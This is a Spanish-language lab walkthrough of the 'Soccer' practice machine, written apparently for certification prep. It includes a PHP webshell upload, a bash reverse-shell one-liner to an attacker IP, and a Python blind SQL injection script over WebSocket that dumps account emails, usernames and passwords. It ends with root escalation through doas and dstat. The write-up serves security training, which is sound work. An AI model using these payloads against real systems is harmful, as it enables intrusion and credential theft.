# Soccer<br>


Sistema Operativo: Linux

Dificultad: Fácil

Técnicas Vistas: Web Enumeration, 
Abusing Tiny File Manager (RCE by Uploading a Malicious PHP File), 
WebSocket SQL Boolean-Based/Time-Based Blind Injection,
Abusing Doas Privilege (dstat) [Privilege Escalation]

Te prepara para las Certificaciones: eWPT eWPTXv2 OSWE

![Image](https://github.com/user-attachments/assets/d6a659d9-c06a-48d3-b702-166d8af92436)

# Reconocimiento

Hacemos un escaneo con `nmap` para encontrar puertos abiertos. <br>

![Image](https://github.com/user-attachments/assets/75366dc4-63b0-4262-8d86-d93e026a5711)<br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>


Utilizando `gobuster` encontramos directorios.<br>

![Image](https://github.com/user-attachments/assets/5ebd77b6-d710-4b58-bb1a-18203dc9aea7)<br>

- `dir` ->  Buscar directorios 
- `-u` -> Indicar URL
- `-w` ->  Indicar diccionario que voy a utilizar
- `-t` -> Numero de hilos que voy a usar<br><br>


# Explotación subida de archivos

Creamos un archivo `cmd.php`  para controlar el parametro `cmd`.<br>

![Image](https://github.com/user-attachments/assets/7476fe59-5e9d-4dd4-bc10-399f6e574e5d)<br><br>


Lo subimos a la ruta `/tiny/uploads`<br>

![Image](https://github.com/user-attachments/assets/69f7f303-6a78-4c7a-89c0-b18d5292d311)<br><br>


Con la Query `bash -c "bash -i >%26 /dev/tcp/10.10.14.66/443 0>%261"` y escuchando por el puerto `nc -nlvp 443` ganamos acceso a la maquina.<br>

![Image](https://github.com/user-attachments/assets/e41c2744-d27e-4fac-937f-0cc238533dd1)<br><br>


# Escalada de privilegios

En esta ruta de `nginx` encontramos un subdominio.<br>

![Image](https://github.com/user-attachments/assets/d7b67c41-0ed4-41e6-8c47-7ea4dcbd7003)<br><br>


Luego de logearnos, vemos este campo del Ticket, lo interceptamos con Burpsuite.<br>

![Image](https://github.com/user-attachments/assets/ed4ec488-4e9b-4824-8b30-cb46dedf3116)<br>


Descubrimos que se trata de un `WebSocket`, el cual es vulnerable a esta inyección `"id":"83817 or 1=1-- -"`<br>

![Image](https://github.com/user-attachments/assets/28153e92-c650-431a-974d-b9df12c62b22)<br><br>


Podemos hacer un script en `Python` para sacar las bases de datos, tablas, columnas, usuario y contraseña.<br>

```
#!/usr/bin/python3

import websocket, signal, sys, string, json
from pwn import *
from termcolor import colored

def def_handler(frame, sig):
    print(colored(f"\n [!] Saliendo... \n\n", 'red'))
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Varibles globales

characters = string.ascii_letters + string.digits + string.punctuation
ws = websocket.WebSocket()
ws.connect("ws://soc-player.soccer.htb:9091/")


def sqli():

    database = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Database name:")

    for position in range(1, 500):
        for character in characters:
            payload = {
                "id":"83817 or binary substr((select group_concat(email,0x3a,username,0x3a,password) from soccer_db.accounts),%d,1)='%s'" % (position, character)
            }

            ws.send(json.dumps(payload))
            data = ws.recv()

            if "Ticket Doesn't Exist" not in data:
                database += character
                p2.status(database)
                break


if __name__ == '__main__':

    sqli()
```
<br><br>
`(select group_concat(schema_name) from information_schema.schemata)` -> Nos reporta las bases de datos<br>

`(select group_concat(table_name) from information_schema.tables where table_schema='soccer_db')` -> Nos reporta las tablas<br>

`(select group_concat(column_name) from information_schema.columns where table_schema='soccer_db' and table_name='accounts')` -> Nos muestra las columnas.<br>

`(select group_concat(username,0x3a,password) from soccer_db.accounts)` -> Nos reporta usuario y contraseña.<br>

Tenemos el usuario y contraseña:<br>

![Image](https://github.com/user-attachments/assets/f14e3c53-be71-4d44-80ad-2e531706a06b)<br><br>

##### Una vez siendo el usuario player: https://gtfobins.github.io/gtfobins/dstat/ <br>

cat /usr/local/etc/doas.conf   -> Vemos si algun usuario puede ejecutar como administrador algo.<br>

Creamos un archivo en la ruta donde podamos escribir puede ser:  `/usr/share/ | grep "dstat"` o `/usr/local/share | grep "dstat"`<br>

En donde podamos escribir creamos el archivo `/usr/local/share/dstat/dstat_ex.py`<br>

![Image](https://github.com/user-attachments/assets/f67b32ea-31ab-4a66-830f-451359098761)<br><br>

Lo ejecutamos de esta manera:<br>

![Image](https://github.com/user-attachments/assets/a1a3ba61-d5b5-4c27-9651-ecc902eed1ed)<br><br>


Nos convertimos en root:<br>

![Image](https://github.com/user-attachments/assets/a223e6d1-e62e-48b5-88cb-8b2fd8b2cd37)
